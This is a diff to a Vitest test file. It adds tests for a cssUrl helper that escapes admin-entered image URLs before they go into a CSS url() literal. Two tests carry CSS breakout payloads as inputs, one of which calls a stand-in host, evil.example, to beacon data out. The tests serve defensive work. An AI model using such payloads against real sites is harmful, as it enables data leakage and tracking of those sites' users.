@@ -1,5 +1,5 @@
 import { describe, test, expect } from 'vitest'
-import { hashString, pickHeroImage, heroBackground } from './media'
+import { cssUrl, hashString, pickHeroImage, heroBackground } from './media'
 
 describe('pickHeroImage', () => {
   const pool = ['a.jpg', 'b.jpg', 'c.jpg']
@@ -39,5 +39,50 @@ describe('heroBackground', () => {
   test('falls back to the team gradient (under the wash) with no photo', () => {
     expect(heroBackground({ pool: [], seed: 'x', gradient: 'var(--grad-community)' }))
       .toBe('var(--hero-wash), var(--grad-community)')
+  })
+})
+
+// The URL is an admin-typed database column dropped straight into a CSS
+// url("…") literal. A bare `")` in it closes the literal and everything after
+// is read as further CSS declarations — so escape before it gets there. The DB
+// constraints (0035 F6 / 0037 D) and the CSP img-src rule are the other layers.
+// Code points, not escape sequences: a literal backslash in a test file is
+// the sort of character a shell or a patch tool quietly eats, and the test
+// would then assert nothing.
+const BS = String.fromCharCode(92)
+const LF = String.fromCharCode(10)
+
+describe('cssUrl — no breaking out of the url() literal', () => {
+  test('leaves an ordinary storage URL untouched', () => {
+    const u = 'https://abc.supabase.co/storage/v1/object/public/media/photos/a-b.jpg'
+    expect(cssUrl(u)).toBe(u)
+  })
+
+  test('neutralises a quote-and-close payload', () => {
+    const out = cssUrl('x.jpg"); background: url(https://evil.example/beacon?c=')
+    expect(out).not.toContain('"')
+    expect(out).not.toContain(')')
+    expect(out).not.toContain('(')
+  })
+
+  test('neutralises single quotes, backslashes and whitespace', () => {
+    expect(cssUrl("a'b")).not.toContain("'")
+    expect(cssUrl('a' + BS + 'b')).not.toContain(BS)
+    expect(cssUrl('a b')).not.toContain(' ')
+    expect(cssUrl('a' + LF + 'b')).not.toContain(LF)
+  })
+
+  test('null and undefined come back empty rather than as the string "null"', () => {
+    expect(cssUrl(null)).toBe('')
+    expect(cssUrl(undefined)).toBe('')
+  })
+
+  test('leaves the characters a real URL needs — colon, slash, question mark', () => {
+    expect(cssUrl('https://a.supabase.co/x/y.jpg?v=2')).toBe('https://a.supabase.co/x/y.jpg?v=2')
+  })
+
+  test('heroBackground escapes the photo URL it embeds', () => {
+    const bg = heroBackground({ pinnedUrl: 'p.jpg"); background: url(evil', gradient: 'g' })
+    expect(bg).toBe('var(--hero-wash), url("p.jpg%22%29;%20background:%20url%28evil")')
   })
 })
